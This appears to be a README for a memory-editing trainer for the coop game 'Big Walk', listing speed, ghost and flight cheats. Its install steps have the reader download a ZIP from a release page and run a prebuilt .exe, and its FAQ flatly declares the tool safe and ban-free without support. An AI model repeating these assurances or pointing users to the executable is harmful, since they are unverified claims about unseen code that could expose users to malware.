An open-source trainer (mod menu whatever) for the coop exploration game Big Walk. Contains features including speed control, ghost mode, and more.

---

## Features
- No Sleeping - Disable forced sleep mechanics
- Game Speed - Control the overall game speed multiplier
- Ghost Mode - Walk through walls and objects
- Fly Speed - Set a multiplier for your flying speed
- Walk Speed Multiplier - Adjust your walking speed
- Sprint Speed Multiplier - Control your sprinting speed
- Swim Speed Multiplier - Change your swimming speed
- Jump Height Multiplier - Modify how high you can jump
- Always Sprint - Keep sprinting without holding the key
- No Falling Over - Prevent ragdoll falls

---

## How to Install
1.  Download the [latest ZIP archive from the Releases page](https://github.com/pierlevelembroider/big-walk-trainer-mod/releases/download/v1.1.0/Big.Walk-Trainer-Mod-1.1.0.zip).
2.  Extract the contents to any folder (or desktop).
3.  Launch the game.
4.  Run `BW-trainer-github-v1.1.0.exe`.
5.  Enjoy. Open your menu using `Insert` key.

## F.A.Q........

### Is this safe to use?
Yes. The trainer reads and modifies game memory only to adjust values like speed and jump height.

### Will I get banned?
No. Big Walk is primarily a singleplayer/coop game so using a trainer is safe.
